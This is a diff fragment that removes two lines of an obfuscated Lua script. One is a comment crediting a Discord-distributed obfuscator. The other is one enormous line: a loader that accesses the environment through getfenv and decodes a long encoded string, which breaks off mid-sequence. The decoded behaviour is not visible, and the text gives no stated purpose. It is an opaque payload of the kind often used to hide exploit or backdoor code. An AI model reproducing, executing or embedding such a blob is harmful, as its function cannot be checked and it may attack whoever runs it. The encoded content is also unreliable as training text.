@@ -1,2 +1,373 @@
--- obfuscated @ discord.gg/25ms, obfuscation: ib2 fork
-return(function(...)local e,F,c=table,string,bit local f,h,l,W,o,L,I,t,a,n,d=F.byte,F.char,F.sub,e.concat,e.insert,math.ldexp,getfenv and getfenv()or _ENV,setmetatable,select,unpack or e.unpack,tonumber;local K=(function(i)local F,o,G,E,n,f,d=1,function(G)local F=""for E=1,#G,1 do F=F..h(f(G,E)-(20))end return d(F,36)end,"","",{},256,{}for F=0,f-1 do d[F]=h(F)end;local function K()local G=o(l(i,F,F))F=F+1;local E=o(l(i,F,F+G-1))F=F+G;return E end;G=h(K())n[1]=G;while F<#i do local F=K()if d[F]then E=d[F]else E=G..l(G,1,1)end;d[f]=G..l(E,1,1)n[#n+1],G,f=E,E,f+1 end;return e.concat(n)end)("FEMFGWFKIFGWFGYFKJFEGFEfFGWFGUFKJEVEfEUE\\ELEWFEdEDEhEfEXEWEhEgFGYFGXFGWFGIFKJFEMEVEhEUEaEdE`EhEVFKjFKJE`E\\EaFEGEYEdE_EXEhFGZFKJFGWFHcFFmEfFE`FGWFGLFKJELFLUEjFEdEYFLDEEEbEaEhFKKFKJFE]EbFGWFG^FKJEZEhEeE[EbEbE^FL^FKIEEFKJE[EWEWELEVFEiFFZFFZEgE\\FKZEbEUEgFFYEfEbE`FFZEdFLgFFZFMMFMVFMXE^EVFFZFFEFFGFEgFFIFEhFEgFEgFFKFEhFFGFFGFFEFFIFFKFFIFEgFFFFFEFFEFFZElFEaFEGFEWFEgE]E[FEdFFFEeFEYFMaEgEkFM`FE]FFKFFFEUE^FEcFE[FEMEMFEJEYFFFFE\\FE\\FEYFFDFEZEgFEYEVEjEDFEdEZFEUE\\EWFEMFEXFEdEdEMFV]EWEEE[FE]FE]FEWFEYFFJE^FEIFFEFFXFEJELFW_FEUFGWFG[FKJEjFLGFMEFGJFKJFEfEhEWFEKFLDEYE\\EfFMEFMKFKIFEHE_EdEEFLDFLJFGKFKJFEWFM`ELFWnEUFXEFXGFGWFXXFKIFE[EbEfFLYFXKFXMFLDFLdFKJFEVEdFWDFEeFMjFEbE[E\\E_EgFGWFGHFKJFEaEdEfE^ELFYWFMZFFlFKJFEJEhELE_FXFEdFKeEgFEKEWFMjEdEjFXHFKJFE\\EbEgEXE_FLIFMJFKJEUEhEMEXE\\FZKFGWFFnFKJFEbFLYFKcFXLFKeFXhEaEWFEUFLYFL[FXaFKJFEHFWlFX]FX_FZHFLeFXJFWlFEMEWFYIFWDE\\FZHFWdFKIFEcFYdEdFZfFZnEWFY_EjFMhEWEUFM]FWiFKIFE]EXE`EeFLDF[EFYIF[WFGWF[MEWEdFZjFXFFMEFKkFKIFYGEdEUFYWFKeEUFKWFZZE[F\\IF\\KFLDFE`EgEgFKfFWcFXlFXnEWF\\_FKIFWnF\\^FGGFKJFEKFMWFLkE_FF[EnFEcFLIF[]EbEEFF[FZ`EWEVFEEFGWFG\\F\\`F\\LFGWF[`FGWFEeFLDF[FFYbEFFXjFXIFGWFY_EgFF[FYEEDFZIFKIFEJFYWFMnFLnFLKF[LF\\JEjFLnEiE_EEFL]FM[FKJF[KFGWFMDEDEWFKiF^VE^FXFFMZFFbFKJElEbEXFF[FMgEgEaFFbEWFF[EdF\\\\F^kEaF]HEXFKnFLEFWgEVFF[FMjFF[FUJFMWFMYF]iFGWFXhFXGFEXEgFGZFJkFF_EHFE\\FIhFH\\FH_FEaFGWFFGFWjFWgFF[EaEbF^jEVEXELELFMjFYeFFYF]IFZGEdFKnFF[E]EbFLUF^kF_kFMjE`FLYFF[FEfFE`FEfFF[F_GFLkF\\MF]ZFWkEWFXhFXUEUEVF^LFL^FGDFE_FGWFFWF\\hFXDFLDFF[FLDEUFMjF`JFXKEhF`MEhF`VF`XEaF`ZFEcFEXFEeFEeFEdFEJFEdFE]FELF`cFaJF\\MF\\gF]jEbEeE_EbEDFY_FYaFYcFYeFYgFYiFYkFGWFGMFWjFZiFajFELEEELFMEFZmFGWFEXEaEYFMYEhFZjFXjF\\FFGWFEUFEXFEHFbfF\\MFG]FKJFK]FXnF`lF[iF`hFYGFYIEgFZKEaFGWF`nFEXEVFLcF^VFELFMXE_F]UFKJF[lFbDFMEF^VEiFLUFYKF^VFE]FWgFXkFKIF`hFE`FM`FK\\EeFKdFMEFYMFKIFEXFKeE`Fb[Fb]FcWFZgFWlFYLFZgFEdFELFEGFEMFWFFEcF_XF`hF[kF[VFdJF_YFWlEVFdeFclFdhEWFbaFLkFZaFMjFM]F]bFZhEWFdVFL\\F^MFF_FaFFdgFEeEdFbcFK\\FKeF]YF_iFLHFLjEhFZaFLJFbWFKIFeYFe[FWDEhFEGFdLEhE`Fe^FefFZVFbeFajFd[FKIFYhEaF[cF[eF\\MF]VFKIF`]EWEfE[FGWFFmFKJFF`EnFFLFF`EgFFVFF`FFYFEnFfcFFUFFMFF[FEZFEfFF`F]MFcDFKIFLUF_GF\\bFfWFbiFZdFMEFgFFGWFEVEhE\\EjFM_F\\cFGWFeLFfIFb`FdMFcjFLHFc`FXJFXLFZaFg]EVF`HFdXFKIElFZHFFkFKJFFXFFXEnEnFE_EhF`eFLmFMDFEEFEEFF[FfDFGWFFdFL^FeIFWlFdkFXbFGWFEWFYdFf[FKfFEeFaUFenFL^F`nF^MFh^FK_EjEjFLJF]ZF]kFe\\EEFdkFgKFelE`FLJFhmFg_FhEFcmFebFLDFYdFKfFeJFh`FXlFgYFg[F[YEdEaFbUFhaFY_F`eFKnFE[FLDELFhkFKIFGgFEnFjDFKIFaFF]ZFYVFKnFgXFgZFg\\F^VFfYFf\\F^VFZGEUFinFJUFJMFj`Fj`FHEFjGFU`FjeFFGFGjFEnFGWFiYFGWF`hFilF\\kFEHFaUEjFZKEVFLJFgKFjnEhE_FGZFjfFU`FIKFjGF^MFFcFaFFhmFE[F[\\F^DFGWFWnE_E_FkEF\\DFgeFGWF^IFMXEUFKiFZZFKJFF[FFIFGWFkmFlGFGWFlEFlIFKiFKLFG]FMKFKiFlWF^UFKDFKJFlYFFaFFJFlIFlYFL]FG[Fl[FKIFlYFlcFKJFKkFKiFFmF_fFKLF^VFGWFGFFMFFKLFKJFJgFMFFL^FlKFKLFKLFfWF]VFmMFlIFG]FKFFMFFhEFKiF^[FldFjjFlIFlkFdXFlnFmEFL]FmGFlJFlFFmgFGWFcDFlKFL]FL]FMKFlKF^VFdJF]VFnDF\\_FmZFdXFFcFlLFWcFm`FnVFljF_fFWdFmeF\\_FmhFnGFdXFKkFnaFWdFWiFnMFWdFFiFnWFlgFKIFniFn[Fc`Fn^FmWFL^FmIF]VFlHFF[FJnFc`F]VFXXFhYFmlF\\_FLeGEDWFMKFWdFbWGEDWFdgFKiGED_Fd[FKXFKJF]VFYMFKLFf^GEDXFGVFlDFKIFcDFcDFhEGEDiFMKFY]FKIGEDiFYMGEDiFL^FKkFgKFKJFcDFKkFmhFZIFn`FleFZIFZYGEDWFbhGEDaFKIFKkFKkFGDFh]FLKGEDhFKIFYMGEDkFKIGEDbFYMGEEEGEEcFGWFGEFKJGEDiFWiFmEFM[FXXF]bFKJFYMFXXGEEZFYMFcDFdgFkaGEEmGEFFFKkF\\gGEDWF]ZGEF]GEEdFe^GEE`FLKFnVFlhFLKGEEKFKIFWiGEElFlJGEFnFe^Fh\\FKJFXXFbhFKJFWiFhaGEGMF^MFL^FlHGEDdFKIFlHFFDF^MFlHFMZFlHFenFlHEeFlIFfJFjHFjFFjDFE_FJjFaFFjXFYdFf\\FgKFkjFMjGEDXFKIEVF[]FLhGEHIFkiF`\\FYdFg]FfcFF`FLJFgVFffFFFEiGEH[FlHFGWGEG^GEDmFm[FKIFWdFm^FnXF^UFmbF_fGEHiFKJFmEFlMFL^FJ^FlIFgKFFmGEDgFmJFf]FKIFnKGEEIGEHgFg]GEDiF]VGEIJGEDmGEHUFKJFKiFcDFnnFKLF]bFGUFJMFd[GEEfFlHFnkFGWGEIiFKIFE\\FdXFlHFG]FJUFMFGEImFlbFm`GEImF^eFM[FYMFF[FElFmFFZIGEIkFLeFljFLeFL]FbhFmnFdXF[`FFYFg]FKJEmFdXFmXFG]FJlFf_FlIGEJKGEJmGEJ^FdXFhaFF[FnKFL]FLeGEDiGED]F^MGEEVFL^GEIbFMFFgFFcDFF]FnjFm`GEK]FnnFcDGEEZFnVFL]FgVFMFFjDGEIkFFZFmbGEJ_F[iGEKIFdXGEKKGEIUF\\_GEG[GEDeGEGXGEDXGEIFGEK[FGWFFXGEK^FhFGEHlGEDXGEKcFdXGEKfFKLFjHGEGeGEG\\FKJFZYFKJGEG[FEeFcgGELfF`lEWFcKFYJGEHUFjUFicGEIMFfmF[iGELnFM_FZcFLZFcdFYmF`MF`mGELJFglFb`FcZF[iF[bF[dFLDGEMJFZeFdgFbaFZbFgMFkhGEM_FMEFhaFYgFK\\FifGEMfFg`FfKFfMFXjFciFckFgKFfYFf[FZXFf_FFLFfbFfdFffFfhEgFfjFF[FEnE^EjFF`FFMFg]FjYFkhGEHGEUFjHElFE_FjHFHLFEnGEHbFEdFlDFhYFlHFnnFmkFKJFFfGEJnGEKZFlYGEKYGEHgFm`GEKYGEIkGEJMGEVDGEI`Ff]F_fGEIWFKIGEVIFKiFmkFnMFKiGEImFm_FKJGEVYGEGfGELYFlbFL^GEV`GEJiFmlFlYFY]GEIjFm`GEWFGEHjFKIGEVhGEVEGEV\\FdXGEEVGEVmFmkFmcFlUGEEWFm[FKiFnZFlIGEIkGEW_GEIkGEG^GEDaFhYFL]FlXGEWUGEDfGEVlGEWVGEKZFm[FL]GEK`GEW`GEK_FlIFF[GEWfFl`GEWiGEF^GEVIFL]GEDFFlVFdXFF_GEViGEIkGEXZGEDaFlFFKLFKiFWiGEIkGEJYGEWeGEJEFZIFmcGEDUGEWkGEXVGEVKFdXGEXdFlZFKJGEXnFFmGEKlFb_FnaGEXaFKIGEJhFmkFlUFEYFMFGEKjGEVaGEWJFGWGEYYGEWUGEW[GEVUGEYEGEXHFmjFKJGED^GEXJFL]FKXGEXhFGWGEGEFGWGEXUFc`FlUGEWnFGWFFKGELWFKIGEZGGEVfFKIGEYFFLeFWdFb_FGWGEJeFnJFL^GEJhFWdGEJjGEYWFKLGEXnFn]Fm`GEYFFllGEHUGEYGFdXFjkFF[FEXGELDFGWFY]GEDWGEZ]GEIUGE[DF\\_GELcGEIVGEJZGEDWFnKGEELGEVnGEGXFlHF`nFjHGEEWFcEFYZFZVGEH\\FiaFjVF\\bFL^GEG[FFmGE[bGEViGEDiGEIFFM[GEEZGEGYGEKgGEJfFWiGEX^GEDXGEZZFG]GEELFliGEDXGEIkGE\\JGEIkGE\\DFmiGELIGEKeEHGEIIFlIFlmFm`GEDIFKIGEFLGEIMFGWGEL`GEViFlFGEHkFKIFLFFgdFjkFVnEfF[FE`FF[FKmFLDGE\\iEhFEiFkhFLXGEMKFg]FgcFgUFcEEaFYbFMDFKhFhZFEYFa]FF[GE]ZE^GE]JFjiFKIFM_FMaFMcFMeEiGE]GFFYEZEWEiFFZF`WFLUFLDFEnFYaFYWEhF_\\FElFFEFFFFFJFU\\FFHFFJFEhFFIFFJFFGFFHFFDFFJFFJFFaFWfFLHFbaGEHKFieF_[EgGEJYF^VGE^eFMEFgKGE]^EeF_\\FhZFiMGE]`F[\\GE]JFL^FmGFdgFEKF[cF`]F[^GE]JFgVGEHKGEMjEjGEHUEiGEHWF\\bFFEFKJFc]F[lF\\lGEMfFEiFF[FIKFJmFIJFJFGEH[FGJFEWFjVF]EF_MFibFM_FF[EiEUFZUEWGE_kGEH^EiFflFKVFgVFcFGE[^GEIlFf_F_JFfbFFYGEH_GE`]FFMGE_kGE_mGE`DGEH[GELmGE`LFgJFKJGEMfFjHFGHFaFFlHFGJFjHFJ[FaFFgVEjGEUIFf\\FgVEnFEFFGMFGJFEEFFVFkhFcbFZGGEHUFgHF]]GE[ZGEI^FKIFZKE`EbFLkGEHUFMnEaFXfF\\bFhaFGJFXKF_FFF[GEalFZKFF\\F_XGEbEFKeFghGEJDFKIGE^nFEiF`hF[nFXGFFLFFbFELFkMFY`F`HGEbaEhFFbGE`iGEbeFZGF`GEUFeKEbF_ZGE^LEaGE^hGEbFEhFFLGE^VGE^XFEgGE^ZGE^\\GE^^GE^`GE^bFFWFF[F^`FmhGEbkGEHUFemF[eEgFkJFcaFWDGEadGEFjFGWFGgFJZFJgFIcFF[GE]^F`YFYhFF[FYkF^jF``F`bFYHGEaEFKIFMnFbEGEUeFKJFJDFEWFIgE`FLcFgVFcfFkMGEcfGE_aFMXF]XF^VFKeF^YGEY\\FWjF`aF`cFKeFLYFaKEeF]HFLjFYIFF[FELF\\JEDF`JFMgFMiFMkFFYFiDFFZFWEFEHEkFEUFEIE]FKbEYGE]]FEKFE^FE]FEdGEbFFZDFb^FZZFLnGEbZEWFFXFiXFKJFUGFbIGEbGE\\FLnGE^EFgjFcVF]bFZKFZMF]EGEMXFEMEUFc_FgVFE\\FWlFMWFchFZgFE^FEKFELF_XFEWFaYF\\]FcHF^VFEaFZDEEGEEZFJmFL^FniFlmF^MGE[YGEHcGE[JGE[iGEIYFmKGEIYFn]FmaGEZlFWdGEHdGEXkGEKfF^VFKLGEHdGEHhGEXgFKIGEWjGEIXGEDXGEJaGEI^FcDF]ZGEDMGEDXFiYFWdGEXkGELIGE[JGEHdGE\\_FXXGEhLFdXFLeGEhVF]VFeeGEaiFdXGEHdGEKYGEYhGEE]GEGEGED[FZIGEFEFd[GEEHGEEMGEViGEGWGE[kGEEhGE\\bFWiFjHGE\\VFM[F]bFKLFiYFcDFnEGEgVGE\\FFbVGE_UGELKFf]GEKlGE[UGEJeFlnFKIGEeeFmkF]VGEIkFFHGEKkFd[GEhbFE^Fd[GEFDGELFFKkGE[IGEFcGEJ[GEGFFZfFMKGEEfFKJGEJ]GEDlGEiUFMKGEFHGEjGGEiUGEJVFKJFKLGEFhFKLFmEGEilGEjZGEinFWiGEhnFL^FXXFdgGEDiFLeFalFL^GEj_FXkFiYFKkFL]FnfGE\\ZFL]GEX]FMFGEX\\GEYbGEVnGEj[GEYcGEIWGEJDGEV^FGUEIFGWFnVF[VGEYZGEIkGEkZFKIGEIHFjDFF[GEU`GE[EGEj[GEg[FdXGE[GFWdFh\\GEDiFcDFFeF^MFWdGEDnGEJfFKVGEKFFYMGEVIGEEmFlFFYMFYMFFgFKIGEJeGEjkFL^GEJeFWiGEFVGE]JFYMGE\\VFG]GE\\ZFWdGEHmGEXFFYUGEkHGEkcGE\\WGEg\\F^LGEJDGEg\\FKIFGUFFUGEkXFGWGEifF^[GEY[GEmGGEY[GEk]FGWGElkGEMXGElnFGWFFhFkbGEW`GEY[FEKGEldFKIGEk]GEZgFWdGElIFlJFKkGEg\\FniGE\\XGEkmFMFGEEbFn_FmDGELFF]VGEmcGEDWGEI\\FGWFFjGEKXGEMXGEEFFGWGEjfGELIFMKGEEiGEDXGEDWFL^GEnGGEEDGEIYGEXkFlnGEZkFkmGEk_GEjWFKIFh\\GEgfGEgjF]VGEK]GEgjGEEXGEjIGElDFWiGEnLFF^GEmiFWdFMKFiYFL]GEbWFlnGEngGEn[GEHkGEhVFF`FGWFFaGEiLF]VF^`FFLGEg]F]VGEU`GEEZFgVFKiGEh^FGWGEaaFaHFiYF]VGEmDGEgbFc`FKiFFkGEbWGEkDF\\cFWbGEllGEinGEg\\GELVGE[[FjHGEknGE\\bFgKGFDeGEghGEZXGEdlGEkjGEiLGEEgGEgYGEEjFkhFiYFMKGE_eFYMGEHdFMKFFFF_gGEg]FMKGEibF]VGFEdFGWFlFFlnGEKbGE\\bGELaGElVFL^F^VGE]HGEg]FbiFXFGE\\nGE]EF_GGE]HGE]JFgKGE]LFZeGEUFFgdGE`_GE]YGE^GGE]\\FhaFiMF_JFKnFZaGE_MGEndFg`GE_XE`GE_ZEEGE_\\FKYGEHLFifGEdfEUFfYFGWGE_eFKIGE_gF`^GE_jGE_lGE_nGE`EEVGE`GGE`IGEHKGE`KGE[aGE`UGE`WFWDGE`ZGE`fGE`\\GEMFGE`_GE[]FcHGEjFFGWGEH[FF[GE`eGE`gFfmGE`iGFG]GE`lGE[_FKIGEMHGEdWFgLGEMKGE[ZGEaJGEGMGEaMGEaVFWeGEaYGEHUGEa\\GEa^GEa`GEabEdFccGEaeGEcJGEagGEMWFgVGEakGEamGE]WGEdXFLnGEbGF[iGEbJFLZF_JGEbUEhGEbWFgVGEcdFKfGEcgFfJGEciFMEGE\\aGEcmGEdDFF[FE]EhEZF`_GEdnFK`FKbFKdGEfMFcVFgKGEdYFMjF`nGEd]GEd_GEdaFKJGEdcFYJGFHVGEHVF_mGEUEFcaEhGEdkGEKjFcmGEdnGEHKFaYFj\\FF[GEeHFF[GEeJF\\lGEeMEdGEeVF^eFMhFMnGEeZGEe\\GEe^GEe`GEebGEedGEefGEehGEejFMnF\\]FdlFEbGEfDFebGEfFGEfHGEm_F`FFYbGEfLGEfUE]GEfWF_XGEfZFL[GEHKGEf]GEf_GEHUGEfbEWGEfdFg]FEHGEfgGEfiF]bGEfkF^lFXVFg]GEgEEgEEGEHbGE\\ZFLLGEVJGE[jFKJFL]GEHdGEX`GE\\bGEk`GE[JGEVkFiYGEL^GEh]FKIFmUGEI_GEgUGEg`GEXKGFLeFL]GFEgGE[JF]VGEGLF^VGFLWGEIYGEYKGEI[GEKmGFE[F]VGEKLGEI^GEh[Fl\\GEhiGFEbGEhkGEnWGE\\bFYMGEaHGFMUFkhGEiHGEn^Fc`GEgeFc`GEGLGEmHGEKFFKLGELHGEJeFjHGEeeFmXGEZbGELXGEKFFMKGEKHGEifFMKFMKGFMJGEidGEjIFKkFcDFWdGEilGEn]GEGJGEViGEDWFLeFcDGEhgFZfGEZWGEE]GFLaGEinFYMFljGEinGE\\JFf^GEFhGElXGEGWF]bGEDiFXXGE[IGEFkFKkFXXFiYGFMZFLKGEl`FMFGEmYGEIFGEIkGFVLGE\\WGFLYGFUgGEX_GE[mGEmMGEJZGElmGEmDGEEfFlFGFVMFm`GFVaGEY[GEJhGEnbGFFJGEkaGEXfGFUgGFL\\GEkfGFVlGEFHGFMFGE\\aGFLVGEhEFlnFLcGFMnGEnMFlDFlFGFUGGEmEGFE\\GEILFKJGElWGEI_GE]JFMKGE\\JGFVJFL]FEkGEZHFGWGFWbGE\\EGEWgGE[FGEkKFglGEkMGEmVGEkWGEEfGFVfFmdFm`GFXDGFV\\GEVGFKWGEmDFh\\FE[GEVJGEIkGFXMGEZKFGWGFXDGEZgFL]GEjfFF[GElXFL]GEklGEHkGEhkFmkGEmkGFWgFf^GEKMGFWLGEF_F\\_GEmbGFDVFmhGFE^GFUnGEIYGFFIGFMFGElUFM[GEg\\GFFDGFVlGFEJFGWFEbGEGfGEIHFmhFkmFKVGFWgGFYJGFDWGEIYFniGEnIGFMaFhYGEbWGEhGFGWGEXEGEhJFlIGEhVGEXZGFDYGFYfGFDFGEEVGEVkGFEDGEbWFKLGEmYFhkGEVkGFXjFnKGFD[GELIGFXcGEYnGFFMGEV[GFMaGFD^GEmnFGWGEU`FM[FgVFlnFMKFgKGEiIFGWGEmDFMKGFDfGFDhGEg]FcDGELVFWdGFZfGFMhGFXmFMFGFE^GFZ`GFE`GEJfGEF[FKJGFFEGEmDGFLiFZIGFZkGFFEGFZnGFElGFE\\FhkGFFIGEHbGFFKGEMXFg]Fg_F`nFeJGEMeFgMGEEZGFYIGFVWGEV[FFaFEjGEkFGE\\\\GEY[GEgfGE\\UGEkHGFLYFKiGF[nFMFGE\\VGE\\]GEGWFkmGFD[GFLYGEIDGFV]GEY[GEVmFmLGF[mGF\\DFKLFZYGFVbGELbGF\\JFnWFl^FMFGF\\dGEkFFm`GF\\kGFDZGFFJGEmmFmXGEY`GEV_GF\\gGE[JGEJbGEYZGEJGFMFGEW_GEKDFKIGEWbFm`Fh\\FkmGEK]GEhkGF\\ZGEhiFmEGF]GFKIGE\\dGE[XGFZZGFGYFb\\FMEGF[fFdZFgKGEMfGF[jGFWMGEIMGF\\LGF\\bFLKGF\\eGEFFGE\\EGF\\KGFDZFl_FKLGE\\JGF\\WGF^KFKIGF]`GEHbGF]bGEIMGEIkGF\\_GFVZGELaGF\\MFKLFbWGF^JGEiUGFXXGEJMGFVZGEHiGF\\iFKLGEWIGF^YGEZmGEm^GE`bGF\\YGF]EGF^^FmhGF^`GF]JGEkfGEYcGF]MFf^FL]GF]\\GF\\lFKJGF_[GFYgGF]EGF^\\FL^GF_KFL^GF]eGF_]FL^Fb_FXmFYDFYFFYHGELlFjkFEWF[cFieF`XEgFEJGEdgFEHF\\IF\\bFgVFEbFhgFckFbhF\\HF\\JGE\\mF]aGEaFFKbFYhEUF_hF`nFMDEZGEahGFH\\Fg]EZF\\aFGZFj_FjaFJMFIXFjiGEGEFkEFbFE\\FLMFWLGFaGE`FK^GEaeGFGnFLJFc\\Fc^GEHUGF`KFcUF\\bFc\\GF]iGEMXGF[gF^VGFKnGEfeFfJF`ME^FGZEGFGDFImFEfFHMEFFKDFjiF]bGEejGFHhFZGFYKGE[IFcfFZKELFaUEDGFaIFWDFb\\FhhGFaUGELeGELgGE[^GELjGF_lGFaeFGWGE]VFg]F^]FYXF]cFKJFE`FkdFF[FLmEXEUGEeDEXEiGE`\\E]F_FF^jF^GF_nFYhFZGFa^GFJaGFJcGEeLGEeUFFbGFFjGEeEFj\\FF\\FGJGEdFGE]_GEeXGFJjFMlGFJlFEMGEe_GEeaGEecEfEYGEHbEiFL^FjiGF[aGEDWGEHiGFUdGE[VGE[lFmkGEDWGF_LGEinFmXGEjXGFUaGFL_GEDiGEhIGEinFnKFcDGFXhGFUkGFE[GFdcGEDXGEF]GE[JGFFIGEndGFL_FiYGEYZGEnXGF^WGEFIGE[JGEhDGFd[GEXHGFUaGEIYGFdVGE[KGFeHGFdKFWdGEGVGFUaGE[EGFd]FdlGEHkGF[aGEVnGEi`FL^GElFGE\\WFYMFMKFeeFmIGEGLFjjGEbWFYMFKXFncGElKFZIGEDkGF\\iFYMGEXEFhEGEIkGEXEGEIkGFEjGE\\EFdgGFUUGFenFYMGEZnFhYGElLGELYGEGUGEWkGEl^GF[HFLeFKkGEELFF[GEnlGEFfGEFJGEUKFM[GEEYGFeIGEFlGE`bFgFFKkF^`GEWGFKJGFgFGEiXFLKGEjLGFFLFWiGEF]FLJGFfkGFXXGFWeGFgJGEFmGEEmGEF\\Fd[GFfcGEFFGFYEFd[GFLYGEDbFKLGEEfFgFFYMGFfMGEYDFKIGFgjGEZgFYMGFgLGFE\\GFfkFKYGFgcGEicGFg\\FlJFEDGEigFLKGEDiFKkGFeGGFhIGEmkGFedGEjUGEFFFmhGFVGF\\UGFg`Fd[GFfdGFEbFYMGFhbGFhXF^MGEILGEIaGEjnGEYlGF\\FGF_MGF_IGFY]GEWDFdXGEmLGEmKGEGfGFD[FjDGEmaGFe\\GEDHGEhiGEeeGE[EGFUMGFXFGEGfGFegGEIMFF[EGFLKFKkGEkdFZfFYMGED^FKIFXXFXXGEnUGFVEGEKZGEFFGFXGGFVeGFiKGEXfGF]HFGWGFhMGFhkF\\_FEIGFhnFm`GFjMGEKFFWdGFfdGFFGF\\_GFfcF_fF]VGEhDGFaXGEmjGEY[GEYWFkmFmIGEhHGEUnGFXkGEmEFmcFcDGEGIFKIGE]JGFEWFkmGF_eGFEaGFaVFcGFiFFbXF`iFXLF`kFXWFZgGFkUF\\ZF\\\\F\\^F]bGFKLEaFMDGE\\mGEViGEEVFgKGEacGEMLFKIFcfEaGFbcGFbeGFk]F\\WFM`GFk\\GEenGFk_GF`_FGXGFe^F^MGEZWFmIF^MFnMGFEbGEHiGEIkGFUcFKIGFlLGEhiFmIGEgXFGWFLJGFUaGF_IGF[bGFHFGELJGFl[FhkGFl]GEJfGFl`GFjbGE\\cGEV[FKIGEhgFFmGEibGEHnGEinGEHiGEEZGE[kGE[LGFWGGEV[GEVbGELaFm]GFgkFmaGE\\EGEIjFlJGEVZFKiF]VFG]EXGEMXGFm_FKIEcGFlmGFmeGFFnGFmhGE[JFKJGFmfGFkHFJ_GELJGE]JGEYZGFkFGFmgGEckGF]DGFlMGFmbGEWMFfWGFmmF^MGFnDGEGXGFnWGEHbGFnWGEEZGFnWF`nFFmGElUGF\\[FhjFg]GFmLGFXIFmdF^MGFdWFlnGFmXGFE\\FlYGFWZFd[GEKfFiVGFjbGFVJGF^eGFjUGEYdGFi]GF\\EGEEmF]hFmXFL]GFeLGEgLGFe]GFniF\\_GFe^FlHFEZFkmGEZgGF[bGEZgGFmGFlKGFmIGFiGGEIaGEX[GEVVGF_GGFnnGFD[GF[aGFEEGEndGEKFGF[bFlKGEiVGEXXFKIGF^fGFmYGGEUGFllGGDdFb_GEG]GEh[GFd\\GGEZGF^EGFZZGFlUGF_HGF_GGEImFGWGEIHF^MGGDeGFUYGFVdGFmdGEVcFh[GFWcGF_[FmcGGDjGEEIFLeGFncGF\\`GEIdFmlFm[FKLFnmGF_GGGFVGEWZFg`GFX[GGEiGEZlGFULGEZEGFDFGFlWFm`GGF`GEWUGEjlGEFIFn\\F[iFFmFJkFc`GEYIGFMHGEiUGEnLGELHGFddGF[HGEI^GGFlGEDXFcDFbWGEEJGEYjGFlMGFhIGEhcGFYLGEDbGEEGGEWUGFDDFL^EnFd[FWiGEnXFKkGGGIGEFfGGGLGFihGFfiGEhhGEFYGEj^FLKFY]GEjdGE`bFM[FWiGGFHGELFFXXGFgLGFUZFe^GGGmF_fFKXGFWFFEZFXkGGGEF[iGEnXFLeGGHJGGEMGGHLGELFGEDkGEnUGGH_GEDkGFdZGEiUFbWGGGmFKIGEDkGFnJGGHdGFlJGEndGEZgFbWGGHJGFjMGFelGF_FGEDiFhEGFjmGELdFmaGGHfFKXFKXGGHiFmaGFXaGE[cGFFWGGDLGFUaGEDiFKXGGH^GGGUFWiGGIZFY]GEmcGFbdGGGUGFU]Ff\\GEG[GEnXGEDkGGIcFhEGGIeGELFFf^GF[kGF[UGELFFL^GEGEGGHfFhEFMKGEmYFgFFhEGFjDGEIkGFXDGEIkF]MGE\\EGGJWFGWFniGEXIFmaFhEGEnIGFXYGGIVFmJGEIHFY]F^VFFmGEmYGFVkGEgjFZYGEbWGEgjGEEfGEnjGELFGEFHGFDFFM[FY]GEFHGFVgGF_YGGFfGEUKGEXZGEEIF_fGEEfGFDYGGK_GEFGGFnKGEm_GEIUGGKYGEWUFZYF^`FKJGFWbGFHEGEgjGEFHGFD_FM[GFWFFL^GEFHFmXGFZVGEFHF\\MFKiGEkbFm`GGLUGF^UFdXGGLYGEXbGGLXGF_GGEeeGEXeGEFHFMKGEmDFmcF\\gGEaaFKJGE]JGEFHF\\gGFnHGGEYGGKdGEYIFlFGEFHGEFHFaHGF\\MGEFHGFiaFKiGFZnFm`GGMKGEY[EKGEXHFhYGGLbGFZgGEWUF\\gGEJeGGLhGGKdGGLkGF]dGFmgGGJeGEFHF]VGFJZGEJhGGLJFmJGEJDGGMFGELdFKXGEG^FKEFlIGEFHGEIkGGUFGFXXFJdGGMYGGKdGGLcGGM]GFGWFL^GGLiGFWLGGLlGE[gGGH]FdlGE]`GGKdGEFHGGGfGFWLGFEjFM[GGLjFMFGEDWGGMmGGIZF\\gF_hGGUfGFWLGGHfGGMmGEibFKJGGMjFKLGGLLFGWFJ`FlIGFFGFm`GGVMGFXXGEIgGGLaFZIGGLdF_fF\\gGFGXGFjnGGMaGEGfGFkGFmlGFmbGFgLGEYZFGWGFnYGFh]GGViGGIUFKJGGVjFb_FGYELGEmmFlHGGWFGGVDGEEWGFmbGEKdFnWGGVlGEWKGGWLGGEmGEgfFgFGGVjGEFVGGVjGFWFGGVjGFUnGGVjGFnJGGVjGEKfGGVjF`nGFmaFGWGEklGE\\_FXIGGW]FL^GGW_GGXDGF\\fGGVnFKJGGWdGE[[GGXHGFmkFKIGGVjGGJnF\\MGEVIFl_GFXjGElUFYMGEZGFKJGElUGEmYFM[GEmcGEmYFlnFFhGFlHGFm]GEGFGEnIFEgGEWUGEK]FEhGEWkFhYGF]^GGFLGEGFFIZGFWcGGYIGFXXGGXfGEKFFhYGFFmFF[FEFGEGFFhYGF\\DFKJGEbWGEhgGEDWGEK]GEnIGFWbGEDlGGYFFgFFhYGGYMGF_GGGYhGGJeFhYGEnIGEJYFmcGEK]FEmGGYDGF__GGVJFl_FhYFHkFlIFjiGEIkGGZLGFXXFG]GGXgGGYkGEnHFGWGGYnGGMXGEK]FaFFM[GGYEGGUhFKIGEbWGEDkFLcGGY]GFeMFGWGEbWGEbWF_fGEDWGGZlGFYVGEinGG[EGGIMGG[EFhYGGY`GGZkF[jGELFGFDFGGYWFlFGFDFGFDFGGY\\GEJeGEXZGEiZGFldGGKLGFhmGFDFGFDYGEZDFGWGFDFFHaGFWcGG[hFkmGEJeGFDFGEnUGG[]GGZ\\GEJgGG[fGEJZGEIfFGWGEUmGGYhGFDFGFVUGGZZFhYGFDFGGYmGEWUGFDYFEeGEWkGG[cGEWmGG\\GFHWGFWcGG\\aGFXXFHIGGUMGFDFFKkGGGmGGVMGFDYFKVFM[GG\\^GGHfGG[ZGGIJFKIGFDYFEWF^MGG\\nGEinGG]EGEZkGEJmGGJhFL^GG\\^GG[kGG\\GGFhEF^`GEXZGGKIGG]XGGZjGEXZGGYbGELFGFDYGEYWGFXjGFD[GEXZGGHXGEDiGFD_GFXMFM[GFD[GGLFFL^GGKbGFimGFldFG`GGDkFKJGG^JGFXXFGaGELYGFDYGGKkFKIGE_eFZYFZYGFDFFFmGGMHFGWGGYWGF^[GF]DGEb\\FKIF^`GGKnFKIGG^EGFYLFGWGFD_GGXnGEnIFiYGFD_GFWbGEK]GG_EGGIiGFDFGG_IGEifGFDYGEHdGFD_FEHFGWGE]dG